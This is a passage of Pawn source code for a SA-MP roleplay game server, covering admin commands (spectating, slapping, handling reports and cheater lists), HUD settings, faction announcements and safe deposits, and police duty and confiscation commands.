            BeforeSpectate[playerid][pOldPos][1] = y;
            BeforeSpectate[playerid][pOldPos][2] = z;
        }
        else
            BeforeSpectate[playerid][pInVehicle] = GetPlayerVehicleID(playerid);
    }

    s_PlayerInfo[playerid][pSPlayerSpec] = id;
    
    new 
        weap, am, are = 0, wName[50];

    format(gString, sizeof gString, "%s's guns:", GetName(id));
    for(new is; is < 13; is++) 
    {
        GetPlayerWeaponData(id, is, weap, am);
        if(weap >= 16 && am >= 1) { 
            are = 1; 
            GetWeaponNameEx(weap, wName, sizeof(wName)); 
            format(gString, sizeof gString,"%s [%s-%d]", gString, wName, am); 
        }
    }
    if(are)
        SCM(playerid, COLOR_GREY, gString);
    else
        SCMF(playerid, COLOR_GREY, "%s doesn't have any weapon!", GetName(id));

    new 
        Float: health;
    
    GetPlayerHealthEx(s_PlayerInfo[playerid][pSPlayerSpec], health);
    
    if(PlayerInfo[playerid][pAdmin])
    {
        if(Iter_Contains(Cheaters, id)) 
        {
            new
                reportedByPlayer = GetPVarInt(id, "reported_by_player");
            
            SCM(reportedByPlayer, COLOR_GREY, "Reportul dvs este in curs de verificare.");
            
            ABroadCast(COLOR_ADMCHAT, 1, "Admin %s is now spectating %s - reported for cheats", GetName(playerid), GetName(s_PlayerInfo[playerid][pSPlayerSpec]));
            updateCheaterVariables(id);
        }
        else if(GetPVarInt(id, "reported_for") == REPORT_TYPE_DM) 
        {
            new
                reportedByPlayer = GetPVarInt(id, "reported_by");
            
            SCM(reportedByPlayer, COLOR_GREY, "Reportul dvs este in curs de verificare.");

            ABroadCast(COLOR_ADMCHAT, 1, "Admin %s is now spectating %s reported for DM", GetName(playerid), GetName(id));
            updateReportVariables(reportedByPlayer);
        }
        else if(GetPVarInt(id, "report_type") == REPORT_TYPE_STUCK) 
        {
            SCM(id, COLOR_GREY, "Reportul dvs este in curs de verificare.");
            
            ABroadCast(COLOR_ADMCHAT, 1, "Admin %s is now spectating %s - reported for being stuck", GetName(playerid), GetName(s_PlayerInfo[playerid][pSPlayerSpec]));    
            updateReportVariables(id);
        }
    }

    SCMF(playerid, -1, "(%d) %s | Level: %d | Health: %.0f | AFK: %d | Duty: %d | Ping: %d | Virtual: %d | Interior: %d", s_PlayerInfo[playerid][pSPlayerSpec], GetName(s_PlayerInfo[playerid][pSPlayerSpec]), PlayerInfo[s_PlayerInfo[playerid][pSPlayerSpec]][pLevel], health, s_PlayerInfo[s_PlayerInfo[playerid][pSPlayerSpec]][pSAFK], 0, GetPlayerPing(s_PlayerInfo[playerid][pSPlayerSpec]), GetPlayerVirtualWorld(s_PlayerInfo[playerid][pSPlayerSpec]), GetPlayerInterior(s_PlayerInfo[playerid][pSPlayerSpec]));

    Iter_Add(Spectators, playerid);
    TogglePlayerSpectating(playerid, true);

    SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(id));
    SetPlayerInterior(playerid, GetPlayerInterior(id));

    if(GetPlayerState(id) == PLAYER_STATE_DRIVER || GetPlayerState(id) == PLAYER_STATE_PASSENGER) 
        PlayerSpectateVehicle(playerid, GetPlayerVehicleID(id)), SetPVarInt(playerid, "spectate_state", 2);
    else if(GetPlayerState(id) == PLAYER_STATE_ONFOOT)
        PlayerSpectatePlayer(playerid, id), SetPVarInt(playerid, "spectate_state", 1); 

    return 1;
}

YCMD:slapcar(playerid, params[], help)
{
	check_admin

	new
		Float: x, Float: y, Float: z, vehicleId;

	if(sscanf(params, "d", vehicleId))
		return sendSyntax(playerid, "/slapcar [car id]");

	if(!IsValidVehicle(vehicleId))
        return SCM(playerid, -1, "Invalid vehicle id.");

	GetVehiclePos(vehicleId, x, y, z);
	SetVehiclePos(vehicleId, x, y, z+5);

	return ABroadCast(-1, 1, "{FFFFFF}({c40b0b}Admin Info{FFFFFF}) %s slapped vehicle %d.", GetName(playerid), vehicleId);
}

YCMD:slap(playerid, params[], help) 
{
    if(PlayerInfo[playerid][pAdmin] < 1 && PlayerInfo[playerid][pHelper] < 1)
        return sendAcces(playerid);

    new 
        targetId, Float: pos[3];

    if(sscanf(params, "u", targetId)) 
        return sendSyntax(playerid, "/slap [name/playerid]");

    if(!IsPlayerConnected(targetId))
        return SCM(playerid, COLOR_GREY, "Player not conntected.");

    SCMF(playerid, COLOR_RED2, "You have slapped %s.", GetName(targetId));
    sendStaffMessage(COLOR_ADMCOMMANDS, "%s used command /slap and slapped %s(%d)", GetName(playerid), GetName(targetId), targetId);

    GetPlayerPos(targetId, pos[0], pos[1], pos[2]);
    SetPlayerPosEx(targetId, pos[0], pos[1], pos[2] + 5.0);
    
    PlayerPlaySound(playerid, 1190, pos[0], pos[1], pos[2]);

    // log admin

    return 1;
}

YCMD:down(playerid, params[], help)
{
    check_admin
    
    new
        id, size;

    if(sscanf(params, "ui", id, size))
        return sendSyntax(playerid, "/down [name/playerid] [size]");

    if(!IsPlayerConnected(id))
        return SCM(playerid, COLOR_GREY, "Player not conntected.");

    new
        Float: fPos[3];

    GetPlayerPos(id, fPos[0], fPos[1], fPos[2]);
    SetPlayerPosEx(id, fPos[0], fPos[1], fPos[2]-size);

    return sendStaffMessage(COLOR_ADMCOMMANDS, "%s (%d) used command /down and slapped %s (%d)", GetName(playerid), playerid, GetName(id), id);
}

YCMD:cr(playerid, params[], help)
{
    check_admin

    new
        id, closeReason[144];
    
    if(sscanf(params, "uS(in curs de rezolvare)[144]", id, closeReason))
        return sendSyntax(playerid, "/cr [name/playerid] [text(optional)]");

    if(!IsPlayerConnected(id))
        return SCM(playerid, COLOR_WHITE, "Invalid player.");

    if(GetPVarInt(id, "o_report_type") != REPORT_TYPE_OTHER) 
        return 1;

    new
        reportString[144];
    
    GetPVarString(id, "o_report_reason", reportString, sizeof reportString);

    ABroadCast(0xa39fffFF, 1, "%s closed report from %s [%d, level %d]: %s", GetName(playerid), GetName(id), id, PlayerInfo[id][pLevel], reportString);
    
    if(strcmp(closeReason, "in curs de rezolvare", true))
        ABroadCast(COLOR_ADMCOMMANDS, 1, "%s -> %s: %s", GetName(playerid), GetName(id), closeReason);

    SCMF(id, 0xd35845FF, "Reportul tau a fost inchis de catre administratorul %s, motiv %s", GetName(playerid), closeReason);

    DeletePVar(id, "o_report_reason");
    DeletePVar(id, "o_report_type");

    if(!GetPVarInt(playerid, "report_type"))
        Iter_Remove(sendReport, playerid);

    return 1;
}

YCMD:dr(playerid, params[], help)
{
    check_admin

    new id;
    if(sscanf(params, "u", id))
        return sendSyntax(playerid, "/dr [name/playerid]");

    if(!IsPlayerConnected(id))
        return SCM(playerid, COLOR_GREY, "Player not connected.");

    if(GetPVarInt(id, "o_report_type") != REPORT_TYPE_OTHER) 
        return 1;

    new
        reportString[144];
    
    GetPVarString(id, "o_report_reason", reportString, sizeof reportString);

    ABroadCast(0xa39fffFF, 1, "%s deleted report from %s [%d, level %d]: %s", GetName(playerid), GetName(id), id, PlayerInfo[id][pLevel], reportString);

    DeletePVar(id, "o_report_reason");
    DeletePVar(id, "o_report_type");

    if(!GetPVarInt(playerid, "report_type"))
        Iter_Remove(sendReport, playerid);

    return 1;
}

YCMD:reports(playerid, params[], help)
{
    check_admin

    SCM(playerid, COLOR_WHITE, "______REPORTS______");
    foreach(new i : sendReport)
    {
        if(GetPVarInt(i, "report_type") == REPORT_TYPE_DM)
        {
            new
                reportedByPlayer = GetPVarInt(i, "report_player");
            
            SCMF(playerid, 0x2f4fefFF, "%s(%d) - level %d - dm - %02d minutes ago", GetName(reportedByPlayer), reportedByPlayer, PlayerInfo[reportedByPlayer][pLevel], (gettime() - GetPVarInt(i, "report_time")) / 60);
        }
        if(GetPVarInt(i, "o_report_type") == REPORT_TYPE_OTHER)
        {
            new
                reportString[144];
            
            GetPVarString(i, "o_report_reason", reportString, sizeof reportString);

            SCMF(playerid, 0xd35845ff, "%s(%d) - level %d - %s - %02d minutes ago", GetName(i), i, PlayerInfo[i][pLevel], reportString, (gettime() - GetPVarInt(i, "o_report_time")) / 60);
        }
        if(GetPVarInt(i, "report_type") == REPORT_TYPE_STUCK)
            SCMF(playerid, COLOR_GREY, "%s is stuck. [%d]", GetName(i), i);
    }
    return 1;
}

YCMD:cheaters(playerid, params[], help)
{
    check_admin

    SCM(playerid, COLOR_WHITE, "______CHEATERS______");
    foreach(new i : Cheaters)
    {
        GetPVarString(i, "cheater_report_reason", gString, sizeof gString);
        SCMF(playerid, COLOR_WHITE, "%s(%d) - %s - level %d, %d playing hours - score %d - %02d minutes ago", GetName(i), i, gString, PlayerInfo[i][pLevel], floatround(PlayerInfo[i][pConnectTime], floatround_round), GetPVarInt(i, "cheater_score"), (gettime() - GetPVarInt(i, "cheater_report_time")) / 60);
    }

    if(Iter_Count(Cheaters))
        SCMF(playerid, COLOR_WHITE, "Total cheaters: %d", Iter_Count(Cheaters));
    else
        SCM(playerid, COLOR_WHITE, "No cheaters available.");

    return 1;
}

YCMD:dm(playerid, params[], help)
{   
    new
        id;

    if(sscanf(params, "u", id)) 
        return sendSyntax(playerid, "/dm [name/playerid]");

    if(id == playerid)
        return SCM(playerid, COLOR_WHITE, "Nu poti folosi aceasta comanda asupra ta.");

    if(!IsPlayerConnected(id))
        return SCM(playerid, COLOR_GREY, "Invalid playername/playerid.");

    if(GetPVarInt(playerid, "report_delay") > gettime())
        return SCMF(playerid, COLOR_WHITE, "Nu poti trimite un report timp de %d secunde.", GetPVarInt(playerid, "report_delay") - gettime());

    SCM(playerid, COLOR_WHITE, "Reportul tau a fost trimis cu succes!");
    
    foreach(new i : Spectators)
    {
        if(s_PlayerInfo[i][pSPlayerSpec] == id)
        {
            ABroadCast(COLOR_REPORT, 1, "%s (%d, level %d) - {FFC000}deathmatch - {FFFFFF}by %s - auto assigned to %s (%d)", GetName(id), id, PlayerInfo[id][pLevel], GetName(playerid), GetName(i), i);
            onPlayerReportSent(playerid, id, REPORT_TYPE_DM, gettime(), 120, 1);
            return 1;
        }
    }
    ABroadCast(COLOR_REPORT, 1, "%s (%d, level %d) - {FFC000}deathmatch - {FFFFFF}by %s", GetName(id), id, PlayerInfo[id][pLevel], GetName(playerid));
    onPlayerReportSent(playerid, id, REPORT_TYPE_DM, gettime(), 120);

    return 1;
}

YCMD:cheats(playerid, params[], help)
{
    new
        cheaterID, reason[144];
    
    if(sscanf(params, "us[144]", cheaterID, reason))
        return sendSyntax(playerid, "/cheats [id cheater] [reason]");

    if(!IsPlayerConnected(cheaterID) || cheaterID == playerid)
        return SCM(playerid, COLOR_WHITE, "Invalid player name/player id.");

    SCM(playerid, COLOR_GREY, "Report submitted.");

    foreach(new i : Spectators)
    {
        if(s_PlayerInfo[i][pSPlayerSpec] == cheaterID)
        {
            ABroadCast(COLOR_REPORT, 1, "%s (%d) - cheats - by %s (%d), reason: %s - auto assigned to %s (%d)", GetName(cheaterID), cheaterID, GetName(playerid), playerid, reason, GetName(i), i);
            return onCheaterReported(playerid, cheaterID, reason, gettime(), 1);
        }
    }

    ABroadCast(COLOR_REPORT, 1, "%s (%d) - cheats - by %s (%d), reason: %s", GetName(cheaterID), cheaterID, GetName(playerid), playerid, reason);
    onCheaterReported(playerid, cheaterID, reason, gettime(), 0);

    return 1;
}

YCMD:addnos(playerid, params[], help) 
{
    if(PlayerInfo[playerid][pAdmin] < 5) 
    	return sendAcces(playerid);

	if(!IsPlayerInAnyVehicle(playerid)) 
		return SCM(playerid, COLOR_WHITE, "You are not in a vehicle.");

	/*if(PlayerInfo[playerid][pWantedLevel] > 0)
		ABroadCast(COLOR_RED, 1, "%s used /addnos (wanted: %d)", GetName(playerid), PlayerInfo[playerid][pWantedLevel]);
	*/

	AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
	return SCM(playerid, COLOR_WHITE, "Vehicle nos added.");
}

YCMD:factions(playerid, params[], help)
{
    return ShowFactions(playerid);
}

YCMD:gotohq(playerid, params[], help)
{
	check_admin

    new 
    	factionId;

	if(sscanf(params, "d", factionId))
		return sendSyntax(playerid, "/gotohq [factionid]");

	if(factionId < 1 || factionId > SERVER_FACTIONS) 
		return SCM(playerid, -1, "Invalid faction id.");

	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerPosEx(playerid, DynamicFactions[factionId][fceX], DynamicFactions[factionId][fceY], DynamicFactions[factionId][fceZ]);

	return ABroadCast(COLOR_ADMCOMMANDS, 1, "%s(%d) teleported to faction %d", GetName(playerid), playerid, factionId);
}

YCMD:hud(playerid, params[], help)
{   
    gString = "{FFFFFF}Option\t{FFFFFF}Status\n";

    format(gString, sizeof gString, "%sHealth Text\t%s\nAmour Text\t%s\nDisplay FPS\t%s\nDamage Informer\t%s\nPayday\t%s\nLevel progress\t%s\nSills option\t%s\nSpeedometer style\t%s\nMoney Update\t%s\n'Plus' icon\t%s\nSpeedometer\t%s\nPayday time\t%s", gString, PlayerInfo[playerid][pHUD][0] ? (HudColors[PlayerInfo[playerid][pHUD][0]]) : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][1] ? (HudColors[PlayerInfo[playerid][pHUD][1]]) : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][2] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][3] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][4] ? ("{00ff00}Textdraw") : ("{00ff00}Message"), PlayerInfo[playerid][pHUD][5] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][6] ? ("{00ff00}Dialog") : ("{00ff00}Message"), PlayerInfo[playerid][pHUD][7] ? ("{00ff00}#2") : ("{00ff00}#1"), PlayerInfo[playerid][pHUD][8] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][9] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][10] ? ("{00ff00}Enabled") : ("{990000}Disabled"), PlayerInfo[playerid][pHUD][11] ? ("{00ff00}Enabled") : ("{990000}Disabled"));

    Dialog_Show(playerid, DIALOG_HUD, DIALOG_STYLE_TABLIST_HEADERS, "HUD Options", gString, "Select", "Cancel");
    return 1;
}

YCMD:amotd(playerid, params[], help)
{
    if(PlayerInfo[playerid][pAdmin] < 5)
        return 1;

    new
        stringMessage[128];

    if(sscanf(params, "s[128]", stringMessage))
        return sendSyntax(playerid, "/amotd [message]");

    format(SERVER_AMOTD, sizeof SERVER_AMOTD, stringMessage);
    return ABroadCast(0xcc8e33FF, 1, "Admin MOTD: %s", stringMessage);
}

YCMD:showmotd(playerid, params[], help)
{	
	if(!PlayerInfo[playerid][pMember])
		return SCM(playerid, -1, "You are not in a group.");
	
	return SCMF(playerid, COLOR_GENANNOUNCE, "Group MOTD: {FFFFFF}%s", DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
}

YCMD:gmotd(playerid, params[], help)
{
	
	if(PlayerInfo[playerid][pMember] == 0)
		return 1;
	
	if(PlayerInfo[playerid][pRank] < 6)
		return 1;
	
	new
		stringMessage[128];

	if(sscanf(params, "s[128]", stringMessage))
		return sendSyntax(playerid, "/gmotd [message]");
	
	mysql_real_escape_string(stringMessage, stringMessage);
	format(DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], 124, stringMessage);

	SCMF(playerid, -1, "You have changed the group MOTD to %s.",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);
	SS(playerid, COLOR_WHITE, "{58FAAC}Foloseste /gmotd doar pentru anunturi importante. Folosirea /gmotd pentru glume, spam va fi sanctionata.","{58FAAC}Use /gmotd only important announcements. Uses of /gmotd for jokes, spamming will be sanctionated.");
	
	SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, "%s has changed the group MOTD to '%s'.", GetName(playerid), DynamicFactions[PlayerInfo[playerid][pMember]][fAnn]);

	mysql_format(SQL, gString, sizeof gString, "update `factions` set `Anunt` = '%s' where `ID` = '%d';",DynamicFactions[PlayerInfo[playerid][pMember]][fAnn], PlayerInfo[playerid][pMember]);
	mysql_tquery(SQL, gString, "", "");
	return 1;
}

YCMD:gsafepos(playerid, params[], help)
{
	check_owner

	if(PlayerInfo[playerid][pMember] == 0)
		return SCM(playerid, -1, "You need to be a member of a group.");

	GetPlayerPos(playerid, DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][0], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][1], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][2]);

	DestroyDynamicPickup(DynamicFactions[PlayerInfo[playerid][pMember]][fSafePickupID]);
	DestroyDynamic3DTextLabel(DynamicFactions[PlayerInfo[playerid][pMember]][fSafeLabelID]);

	format(gString, sizeof gString, "%s\nGroup Safe", DynamicFactions[PlayerInfo[playerid][pMember]][fName]);

	DynamicFactions[PlayerInfo[playerid][pMember]][fSafePickupID] = CreateDynamicPickup(1274, 23, DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][0], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][1], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][2], DynamicFactions[PlayerInfo[playerid][pMember]][fVirtual], DynamicFactions[PlayerInfo[playerid][pMember]][fInterior], -1, 50);
	DynamicFactions[PlayerInfo[playerid][pMember]][fSafeLabelID] = CreateDynamic3DTextLabel(gString, COLOR_YELLOW, DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][0], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][1], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][2], 100, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, DynamicFactions[PlayerInfo[playerid][pMember]][fVirtual], DynamicFactions[PlayerInfo[playerid][pMember]][fInterior], -1, 20.0);

	mysql_format(SQL, gString, sizeof gString, "update `factions` set `SafePos1` = '%f', `SafePos2` = '%f', `SafePos3` = '%f' where `ID` = '%d';", DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][0], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][1], DynamicFactions[PlayerInfo[playerid][pMember]][fSafePos][2], PlayerInfo[playerid][pMember]);
	mysql_tquery(SQL, gString, "", "");

	return SCM(playerid, COLOR_WHITE, "You have adjusted the position of your group's safe.");
}


YCMD:gdeposit(playerid, params[], help)
{
	if(!PlayerInfo[playerid][pMember])
		return 1;

	new 
		x = PlayerInfo[playerid][pMember], depositAmount, item[30];
	
	if(sscanf(params, "s[30]d", item, depositAmount))
	{
		sendSyntax(playerid, "/gdeposit [money, materials or drugs] [amount]");
		return SCMF(playerid, COLOR_GREY, "Safe balance: $%d, %d materials, %d grams of drugs", DynamicFactions[x][fBank], DynamicFactions[x][fMats], DynamicFactions[x][fDrugs]);
	}

	if(!IsPlayerInRangeOfPoint(playerid, 5.0, DynamicFactions[x][fSafePos][0], DynamicFactions[x][fSafePos][1], DynamicFactions[x][fSafePos][2]))
		return SCM(playerid, -1, "You must be at your group safe to do this.");

	if(strcmp(item, "money", true) == 0)
	{
		if(GetPlayerMoney(playerid) < depositAmount)
			return SCM(playerid, -1, "You don't have that amount of money.");

		if(depositAmount < 100 || depositAmount > 100000)
			return SCM(playerid, -1, "Value must be between 100$ and 100.000$.");

		DynamicFactions[x][fBank] += depositAmount;
		GivePlayerCash(playerid, -depositAmount);

		SCMF(playerid, -1, "You have deposited $%d in your group safe.", depositAmount);
		sendNearbyMessage(playerid, COLOR_PURPLE, "%s deposits $%d in their group safe.", GetName(playerid), depositAmount);

		mysql_format(SQL, gString, sizeof gString, "update `factions` set `Bank` = '%d' where `ID` = '%d';", DynamicFactions[x][fBank], x);
		mysql_tquery(SQL, gString, "", "");

		// raport mafie
	}
	else if(strcmp(item, "materials", true) == 0)
	{
		if(PlayerInfo[playerid][pMats] < depositAmount)
			return SCM(playerid, -1, "You don't have that amount of materials.");

		if(depositAmount < 10 || depositAmount > 100000)
			return SCM(playerid, -1, "Value must be between 10 and 100.000.");

		PlayerInfo[playerid][pMats] = PlayerInfo[playerid][pMats]-depositAmount;
		DynamicFactions[x][fMats] += depositAmount;
            
        SCMF(playerid, -1, "You have deposited %d materials in your group safe.", depositAmount);
		sendNearbyMessage(playerid, COLOR_PURPLE, "%s deposits %d materials in their group safe.", GetName(playerid), depositAmount);

		mysql_format(SQL, gString, sizeof gString, "update `factions` set `Mats` = '%d' where `ID` = '%d';", DynamicFactions[x][fMats], x);
		mysql_tquery(SQL, gString, "", "");

		mysql_format(SQL, gString, sizeof gString, "update `users` set `Materials` = '%d' where `id` = '%d';", PlayerInfo[playerid][pMats], PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gString, "", "");

	}
	else if(strcmp(item, "drugs", true) == 0)
	{
		if(PlayerInfo[playerid][pDrugs] < depositAmount)
			return SCM(playerid, -1, "You don't have that amount of drugs.");

		if(depositAmount < 10 || depositAmount > 100)
			return SCM(playerid, -1, "Value must be between 10 and 100.");

		PlayerInfo[playerid][pDrugs] = PlayerInfo[playerid][pDrugs]-depositAmount;
		DynamicFactions[x][fDrugs] += depositAmount;
		
		SCMF(playerid, -1, "You have deposited %d drugs in your group safe.", depositAmount);
		sendNearbyMessage(playerid, COLOR_PURPLE, "%s deposits %d drugs in their group safe.", GetName(playerid), depositAmount);

		mysql_format(SQL, gString, sizeof gString, "update `factions` set `Drugs` = '%d' where `ID` = '%d'", DynamicFactions[x][fDrugs], x);
		mysql_tquery(SQL, gString, "", "");

		mysql_format(SQL, gString, sizeof gString, "update `users` set `Drugs` = '%d' where `id` = '%d'", PlayerInfo[playerid][pDrugs], PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gString, ""," ");
	}
	else return sendSyntax(playerid, "/gdeposit [money, materials or drugs] [amount]");
	return 1;
}

YCMD:gov(playerid, params[], help)
{
	
	if(GetPVarInt(playerid, "delay_gov") > gettime()) 
		return SCMF(playerid, -1, "Asteapta %d secunde pentru a folosi din nou aceasta comanda.", GetPVarInt(playerid, "delay_gov") - gettime());

	if(!IsACop(playerid) && PlayerInfo[playerid][pMember] != 14)
		return SCM(playerid, -1, "You are not a cop or a paramedic."); 

	if(PlayerInfo[playerid][pRank] < 6)
		return SCM(playerid, -1, "You need rank 6 to use this command.");

	new
		stringMessage[128];

	if(sscanf(params, "s[128]", stringMessage))
		return sendSyntax(playerid, "/gov [message]");
    
    va_SendClientMessageToAll(COLOR_TEAL, "------ Government Announcement (%s) ------", DynamicFactions[PlayerInfo[playerid][pMember]][fName]);
    va_SendClientMessageToAll(COLOR_BLUE, "* %s %s: %s", GetFactionRankName(playerid), GetName(playerid), stringMessage);

    return SetPVarInt(playerid, "delay_gov", gettime() + 3600);
}

YCMD:radio(playerid, params[], help)
{
	if(!IsACop(playerid))
		return SCM(playerid, -1, "Your group data is invalid.");

	if(s_PlayerInfo[playerid][pSFactionSpec] == 1)
		return SendClientMessage(playerid, -1, "You have disabled radio chat, use /togf to enable.");
	
	new
		stringMessage[128];
	
	if(sscanf(params, "s[128]", stringMessage))
		return sendSyntax(playerid, "/r [message]");
	
	return SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_RADIOCHAT, 0, "%s %s %s: %s, over.", (PlayerInfo[playerid][pRank] == 7 ? ("***") : PlayerInfo[playerid][pRank] > 2 ? ("**") : ("*")), GetFactionRankName(playerid), GetName(playerid), stringMessage);
}

YCMD:duty(playerid, params[], help)
{	
   	if(!PlayerInfo[playerid][pMember]) 
   		return SCM(playerid, -1, "You can use this command only when you are a member on a faction.");

	if(GetPVarInt(playerid, "delay_duty") > gettime())
		return SCMF(playerid, COLOR_GREY, "Vei putea folosi aceasta comanda peste %d secunde.", GetPVarInt(playerid, "delay_duty") - gettime());

	if(s_PlayerInfo[playerid][pSInHouse] && !s_PlayerInfo[playerid][pSInHQ])
		return SCM(playerid, -1, "You are not in a locker room or a house.");

	if(IsACop(playerid))
	{ 
		/*if(PlayerInfo[playerid][pGunLic] == 0) 
			return SCM(playerid, -1, "You don't have gun license.");
		*/
		if(!s_PlayerInfo[playerid][pSOnDuty])
        {
			sendNearbyMessage(playerid, COLOR_PURPLE, "* Officer %s takes some guns and a badge from his locker.", GetName(playerid));

			s_PlayerInfo[playerid][pSOnDuty] = 1;

			GivePlayerWeaponEx(playerid, 24, 500); GivePlayerWeaponEx(playerid, 3, 1);
			GivePlayerWeaponEx(playerid, 41, 500); GivePlayerWeaponEx(playerid, 29, 1000);
			GivePlayerWeaponEx(playerid, 31, 1000); SetPlayerArmourEx(playerid, 100);
			SetPlayerHealthEx(playerid, 100); 

			SetPlayerSkinEx(playerid);
			SetPlayerToTeamColor(playerid);
		}
		else
		{
			sendNearbyMessage(playerid, COLOR_PURPLE, "* Officer %s places his badge and guns in his locker.", GetName(playerid));

			s_PlayerInfo[playerid][pSOnDuty] = 0;

			SetPlayerArmourEx(playerid, 0); ResetPlayerWeaponsEx(playerid);
			ResetPlayerWeapons(playerid); SetPlayerSkinEx(playerid);
			SetPlayerToTeamColor(playerid);
		}
	}
	else
	{
		if(s_PlayerInfo[playerid][pSOnDuty])
	    {
	    	SCM(playerid, COLOR_WHITE, "You are now on duty!");

	    	s_PlayerInfo[playerid][pSOnDuty] = 1;

	    	SetPlayerSkinEx(playerid);
	    	SetPlayerToTeamColor(playerid);
	    }
	    else
	    {
	    	SCM(playerid, COLOR_WHITE, "You are now off duty!");

	    	s_PlayerInfo[playerid][pSOnDuty] = 0;

	    	SetPlayerSkinEx(playerid);
	    	SetPlayerToTeamColor(playerid);
	    }
	}
	return SetPVarInt(playerid, "delay_duty", gettime() + 10);
}

YCMD:departments(playerid, params[], help)
{
	if(!IsACop(playerid) && PlayerInfo[playerid][pMember] != 14)
		return SCM(playerid, -1, "This group does not have an official radio frequency.");

	new
		stringMessage[128];

	if(sscanf(params, "s[128]", stringMessage))
		return sendSyntax(playerid, "/d [message]");
    
	foreach(new i : Cops)
	{
		if(IsACop(i))
			SCMF(i, COLOR_ALLDEPT, "%s%s %s %s: %s, over.", (PlayerInfo[playerid][pMember] == 1 ? ("LS ") : PlayerInfo[playerid][pMember] == 8 ? ("LV ") : ("")), (PlayerInfo[playerid][pRank] == 7 ? ("***") : PlayerInfo[playerid][pRank] > 2 ? ("**") : ("*")), GetFactionRankName(playerid), GetName(playerid), stringMessage);
	}
	return 1;
}

YCMD:confiscate(playerid, params[], help)
{
	if(!IsACop(playerid))
		return SCM(playerid, -1, "You are not a cop.");

	if(!s_PlayerInfo[playerid][pSOnDuty])
		return SCM(playerid, -1, "You are not on duty.");

    new
    	targetId, itemName[15];

	if(sscanf(params, "us[15]", targetId, itemName))
	{
		sendSyntax(playerid, "/confiscate [name/playerid] [item]");
  		return SCM(playerid, -1, "Items: Licence, Drugs, Weapons.");
	}

	if(!IsPlayerConnected(targetId))
		return SCM(playerid, -1, "Player not connected.");
	
	if(playerid == targetId)
		return SCM(playerid, -1, "You can't use this command on you.");

	if(!IsPlayerInRangeOfPlayer(playerid, targetId, 8.0))
		return SCM(playerid, -1, "This player is not near you.");

	if(!s_PlayerInfo[targetId][pSHandsUp] && !s_PlayerInfo[targetId][pSSleeping]) return SCM(playerid, COLOR_WHITE, "Acel jucator trebuie sa aiba /handsup!");

    if(strmatch(itemName, "licence"))
	{
		if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3)
			return SCM(playerid, -1, "You are not in LSPD or LVPD.");

		if(PlayerInfo[targetId][pCarLic] == 0)
			return SCM(playerid, -1, "This player don't have a driving licence.");

		sendNearbyMessage(playerid, COLOR_PURPLE, "* %s has confiscated %s's driving license.", GetName(playerid), GetName(targetId));
        sendDepartmentMessage(1, COLOR_LIGHTBLUE, "* %s has confiscated %s's driving license.", GetName(playerid), GetName(targetId));

		SCMF(playerid, -1, "You have confiscated %s's driving license.", GetName(targetId));
		SCMF(targetId, -1, "%s has confiscated your driving license.", GetName(playerid));

		PlayerInfo[targetId][pCarLic] = 0;
		PlayerInfo[targetId][pCarLicSuspend] = 2;

		// update raport
	}
	else if(strmatch(itemName, "weapons"))
	{
		sendNearbyMessage(playerid, COLOR_PURPLE, "* %s has confiscated %s's weapons.", GetName(playerid), GetName(targetId));
        sendDepartmentMessage(1, COLOR_LIGHTBLUE, "* %s has confiscated %s's weapons.", GetName(playerid), GetName(targetId));

		SCMF(playerid, -1, "You have confiscated %s's weapons.", GetName(targetId));
		SCMF(targetId, -1, "%s has confiscated your weapons.", GetName(playerid));

		ResetPlayerWeaponsEx(targetId);
	}
	else if(strmatch(itemName, "drugs"))
	{
		if(PlayerInfo[targetId][pDrugs] == 0)
			return SCM(playerid, -1, "This player don't have drugs.");

		sendNearbyMessage(playerid, COLOR_PURPLE, "* %s has confiscated %s's drugs.", GetName(playerid), GetName(targetId));
        sendDepartmentMessage(1, COLOR_LIGHTBLUE, "* %s has confiscated %s's drugs.", GetName(playerid), GetName(targetId));

		SCMF(playerid, -1, "You have confiscated %s's drugs.", GetName(targetId));
		SCMF(targetId, -1, "%s has confiscated your drugs.", GetName(playerid));

		PlayerInfo[targetId][pDrugs] = 0;

		mysql_format(SQL, gString, sizeof gString, "update `users` set `Drugs` = '0' where `id` = '%d';", PlayerInfo[targetId][pSQLID]);
		mysql_tquery(SQL, gString, "", "");
	}
    return 1;
}

YCMD:mdc(playerid, params[], help)
{
	if(!IsACop(playerid) && !PlayerInfo[playerid][pAdmin])
		return SCM(playerid, -1, "You are not a cop.");

	new
		targetId;

	if(sscanf(params, "u", targetId))
		return sendSyntax(playerid, "/mdc [name/playerid]");

	if(!IsPlayerConnected(targetId))
		return SCM(playerid, COLOR_GREY, "Player not connected.");

	if(!PlayerInfo[targetId][pWantedLevel])
		return SCMF(playerid, -1, "-- MDC [ID %d - %s][not wanted]", targetId, GetName(targetId));

